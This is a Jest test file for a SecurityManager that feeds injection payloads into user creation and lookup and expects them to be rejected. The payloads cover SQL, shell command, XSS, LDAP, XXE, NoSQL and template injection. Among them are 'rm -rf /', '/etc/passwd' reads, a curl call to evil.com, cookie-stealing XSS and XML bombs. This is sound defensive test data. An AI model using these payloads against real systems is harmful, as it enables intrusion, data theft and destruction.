/**
 * Security Test Suite: Injection Attacks
 * Tests for SQL Injection, Command Injection, and XSS vulnerabilities
 */

import { SecurityManager, LoginContext } from '../../../src/security/SecurityManager';
import * as xss from 'xss';

describe('Injection Attack Security Tests', () => {
  let securityManager: SecurityManager;
  let testContext: LoginContext;

  beforeEach(() => {
    securityManager = new SecurityManager({
      enableAuth: true,
      enableAudit: true,
      jwtSecret: 'test-secret-key-for-injection-tests',
      redisUrl: 'redis://localhost:6379',
    });

    testContext = {
      ipAddress: '192.168.1.100',
      userAgent: 'Mozilla/5.0 Test Browser',
      deviceId: 'test-device-001',
    };
  });

  afterEach(async () => {
    await securityManager.disconnect();
  });

  describe('SQL Injection Attacks', () => {
    test('should prevent SQL injection in username field', async () => {
      const sqlInjectionPayloads = [
        "admin' OR '1'='1",
        "admin'; DROP TABLE users--",
        "admin' UNION SELECT * FROM passwords--",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a",
        "1' AND '1'='1",
        "admin' /*",
        "'; EXEC xp_cmdshell('dir')--",
      ];

      for (const payload of sqlInjectionPayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should sanitize email input against SQL injection', async () => {
      const sqlInjectionEmails = [
        "admin@example.com' OR '1'='1",
        "test'; DROP TABLE users; --@example.com",
        "admin@example.com'; DELETE FROM users WHERE 'a'='a",
      ];

      for (const email of sqlInjectionEmails) {
        await expect(
          securityManager.createUser('testuser', email, 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should validate and sanitize user search queries', async () => {
      const user = await securityManager.createUser(
        'normaluser',
        'normal@example.com',
        'ValidPass123!',
        ['user']
      );

      // Attempt SQL injection through getUserByUsername
      const result = securityManager.getUserByUsername("admin' OR '1'='1");
      expect(result).toBeUndefined();
    });

    test('should prevent second-order SQL injection', async () => {
      // Create user with potentially malicious data
      const maliciousUsername = "testuser'; DROP TABLE audit_logs--";

      await expect(
        securityManager.createUser(maliciousUsername, 'test@example.com', 'ValidPass123!', ['user'])
      ).rejects.toThrow();
    });

    test('should handle parameterized queries safely', async () => {
      const user = await securityManager.createUser(
        'safeuser',
        'safe@example.com',
        'ValidPass123!',
        ['user']
      );

      // Verify user was created with exact values, not interpreted as SQL
      const retrievedUser = securityManager.getUserByEmail('safe@example.com');
      expect(retrievedUser).toBeDefined();
      expect(retrievedUser?.username).toBe('safeuser');
    });
  });

  describe('Command Injection Attacks', () => {
    test('should prevent command injection in username', async () => {
      const commandInjectionPayloads = [
        'user; ls -la',
        'user && cat /etc/passwd',
        'user | whoami',
        'user`whoami`',
        'user$(whoami)',
        'user; rm -rf /',
        'user & net user',
        'user\nwhoami',
        'user||id',
        'user;$(curl http://evil.com)',
      ];

      for (const payload of commandInjectionPayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should sanitize special shell characters', async () => {
      const shellMetachars = ['|', '&', ';', '$', '`', '\n', '\r', '(', ')', '<', '>', '\\'];

      for (const char of shellMetachars) {
        const username = `testuser${char}malicious`;
        await expect(
          securityManager.createUser(username, `test${Date.now()}@example.com`, 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should prevent command injection in audit logs', async () => {
      const user = await securityManager.createUser(
        'audituser',
        'audit@example.com',
        'ValidPass123!',
        ['user']
      );

      // Attempt command injection through metadata
      await securityManager.audit(
        user.id,
        'test_action',
        'test_resource',
        'resource_id',
        'success',
        { command: '; ls -la; echo "injected"' },
        testContext.ipAddress,
        testContext.userAgent
      );

      // Verify audit was logged but command not executed
      const logs = await securityManager.getAuditLogs({ userId: user.id });
      expect(logs.length).toBeGreaterThan(0);
      expect(logs[0].metadata.command).toContain(';');
    });

    test('should handle null bytes in input', async () => {
      const nullBytePayloads = [
        'user\x00malicious',
        'test\x00.sh',
        'admin\x00; cat /etc/passwd',
      ];

      for (const payload of nullBytePayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });
  });

  describe('Cross-Site Scripting (XSS) Attacks', () => {
    test('should prevent stored XSS in username', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
      ];

      for (const payload of xssPayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should sanitize XSS in email field', async () => {
      const xssEmails = [
        '<script>alert("XSS")</script>@example.com',
        'test+<img src=x>@example.com',
        'admin<svg/onload=alert(1)>@example.com',
      ];

      for (const email of xssEmails) {
        await expect(
          securityManager.createUser('testuser', email, 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should prevent DOM-based XSS', async () => {
      const domXssPayloads = [
        '#<img src=x onerror=alert(1)>',
        '#<iframe src=javascript:alert(1)>',
        'javascript:alert(document.cookie)',
      ];

      for (const payload of domXssPayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should sanitize output using xss library', () => {
      const maliciousInput = '<script>alert("XSS")</script>';
      const sanitized = xss(maliciousInput);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    test('should prevent XSS in audit log metadata', async () => {
      const user = await securityManager.createUser(
        'xssuser',
        'xss@example.com',
        'ValidPass123!',
        ['user']
      );

      await securityManager.audit(
        user.id,
        'test_action',
        'test_resource',
        'resource_id',
        'success',
        { userInput: '<script>alert("XSS")</script>' },
        testContext.ipAddress,
        testContext.userAgent
      );

      const logs = await securityManager.getAuditLogs({ userId: user.id });
      const logWithXss = logs.find(log => log.metadata.userInput);

      expect(logWithXss).toBeDefined();
      // Metadata should store the raw value but should be sanitized on output
      expect(logWithXss?.metadata.userInput).toBeDefined();
    });

    test('should handle polyglot injection attempts', async () => {
      const polyglotPayloads = [
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        '\'"()&%<acx><ScRiPt >alert(1)</ScRiPt>',
        '"\';!--"<XSS>=&{()}',
      ];

      for (const payload of polyglotPayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should prevent mutation XSS (mXSS)', async () => {
      const mxssPayloads = [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<svg><style><img src=x onerror=alert(1)></style>',
        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
      ];

      for (const payload of mxssPayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });
  });

  describe('LDAP Injection Attacks', () => {
    test('should prevent LDAP injection in username', async () => {
      const ldapInjectionPayloads = [
        'admin*',
        'admin)(&)',
        '*)(uid=*))(|(uid=*',
        'admin)(|(password=*))',
        '*)(objectClass=*',
      ];

      for (const payload of ldapInjectionPayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should sanitize LDAP special characters', async () => {
      const ldapSpecialChars = ['*', '(', ')', '\\', '/', '\x00'];

      for (const char of ldapSpecialChars) {
        const username = `testuser${char}malicious`;
        await expect(
          securityManager.createUser(username, `test${Date.now()}@example.com`, 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });
  });

  describe('XML Injection Attacks', () => {
    test('should prevent XXE (XML External Entity) injection', async () => {
      const xxePayloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
      ];

      for (const payload of xxePayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should prevent XML bomb (Billion Laughs) attack', async () => {
      const xmlBombPayload = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol2;</lolz>`;

      await expect(
        securityManager.createUser(xmlBombPayload, 'test@example.com', 'ValidPass123!', ['user'])
      ).rejects.toThrow();
    });
  });

  describe('NoSQL Injection Attacks', () => {
    test('should prevent MongoDB query injection', async () => {
      const noSqlPayloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "sleep(1000)"}',
        '{"username": {"$regex": ".*"}}',
      ];

      for (const payload of noSqlPayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should sanitize NoSQL operators', async () => {
      const user = await securityManager.createUser(
        'nosqluser',
        'nosql@example.com',
        'ValidPass123!',
        ['user']
      );

      // Attempt to query with NoSQL operator injection
      const result = securityManager.getUserByUsername('{"$ne": ""}');
      expect(result).toBeUndefined();
    });
  });

  describe('Template Injection Attacks', () => {
    test('should prevent server-side template injection (SSTI)', async () => {
      const sstiPayloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '{{constructor.constructor("return process")()}}',
      ];

      for (const payload of sstiPayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });

    test('should prevent expression language injection', async () => {
      const elPayloads = [
        '${applicationScope}',
        '#{request}',
        '${"".getClass()}',
      ];

      for (const payload of elPayloads) {
        await expect(
          securityManager.createUser(payload, 'test@example.com', 'ValidPass123!', ['user'])
        ).rejects.toThrow();
      }
    });
  });
});
